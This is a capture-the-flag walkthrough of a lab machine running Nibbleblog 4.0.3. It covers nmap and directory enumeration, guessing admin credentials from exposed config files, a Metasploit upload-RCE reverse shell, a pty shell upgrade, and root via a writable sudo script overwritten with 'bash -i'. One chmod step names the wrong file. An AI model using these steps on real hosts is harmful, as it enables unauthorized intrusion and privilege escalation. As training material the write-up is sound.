<b>

# Information Gathering
First i ping the target 4 times to ensure good connection:<br>
`ping -c 4 10.10.10.75`
```
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=109 ms
64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=108 ms
64 bytes from 10.10.10.75: icmp_seq=3 ttl=63 time=108 ms
64 bytes from 10.10.10.75: icmp_seq=4 ttl=63 time=108 ms
```
After that i ran nmap with `-Pn` to not check if the host is alive and `-sVC` for version and script enumeration:<br>
`nmap -sVC -Pn 10.10.10.75`
```
Nmap scan report for 10.10.10.75
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Then i ran `whatweb` to gather additional information about the website:<br>
`whatweb -a 3 10.10.10.75`
```
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```
After checking the source code for the page i found this:<br>
![image](https://github.com/user-attachments/assets/cea217ff-0f73-4330-9765-f02383d391aa)

Browsing to the directory revealed blog page<br>
I ran feroxbuster which showed that the directories were readable:
![image](https://github.com/user-attachments/assets/b6297995-cf2b-42fd-96a0-f940124852d8)

The important one was this:<br>
`http://10.10.10.75/nibbleblog/content/private/`

Two of them revealed login information:
```
http://10.10.10.75/nibbleblog/content/private/users.xml
http://10.10.10.75/nibbleblog/content/private/config.xml
```
And one revealed the version of `Nibbleblog` was 4.0.3:<br>
`http://10.10.10.75/nibbleblog/README`
# Vulnerability Assessment
Looking up "`Nibbleblog 4.0.3 explot`" gave me this:<br>
https://www.exploit-db.com/exploits/38489

The exploit allows RCE due to upload vulnerability that allows to upload a reverse shell<br>
It is mentioned that there is `metasploit` module and for the exploit to work, we need to be authenticated<br>
Unfortunetly we only have username `admin`, after trying a couple common combinations:<br>
- `admin:admin`
- `admin:root`
- `admin:test`

I saw this in `http://10.10.10.75/nibbleblog/content/private/config.xml`:<br>
![image](https://github.com/user-attachments/assets/6257d40c-d085-4340-bf8d-e178299a1f8b)
<br>And after trying `admin:nibbles` at the login form (`http://10.10.10.75/nibbleblog/admin.php`)<br>
We got redirected to the dashboard
# Exploitation
Now that we have the credentials, we can fire `msfconsole` and use the module to get a reverse shell:<br>
![image](https://github.com/user-attachments/assets/6c3f9f09-0807-4cd0-854f-fcc12197fa27)
<hr>

Select it:
![image](https://github.com/user-attachments/assets/4873443b-6381-47af-bf15-b14a9e9fd95e)
<hr>

And finally set the options & run it:<br>
![image](https://github.com/user-attachments/assets/33fb797a-cc19-4864-be9c-ca613cdd60d8)
<hr>

Once the terminal shows `meterpreter >` we can type `shell` to get a reverse shell<br>
# Post-Exploitation
After that we can run `python3 -c 'import pty; pty.spawn("/bin/sh")'` in order to get interactive shell
We run as the user "`nibbler`" and going to the `/home` directory and inside nibbler, we can get the `user.txt` flag
<hr>

After running `sudo -l` we get this output:
```
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

There is also a zip file called `personal.zip`<br>
Running `unzip personal.zip` and then navigating through the directories, we find `monitor.sh`<br>
If we do `ls -la` we notice that we have the permission to not only read but also write<br>

In that case, we can just do:
- `rm monitor.sh`
And create new one with `bash -i` inside like so:
- `echo "bash -i" > monitor.sh`

Then by allowing execution and running it, we can become root:
- `chmod +x monitored.sh`
- `sudo ./monitor.sh`

The root flag is found at `/root/root.txt`
</b>
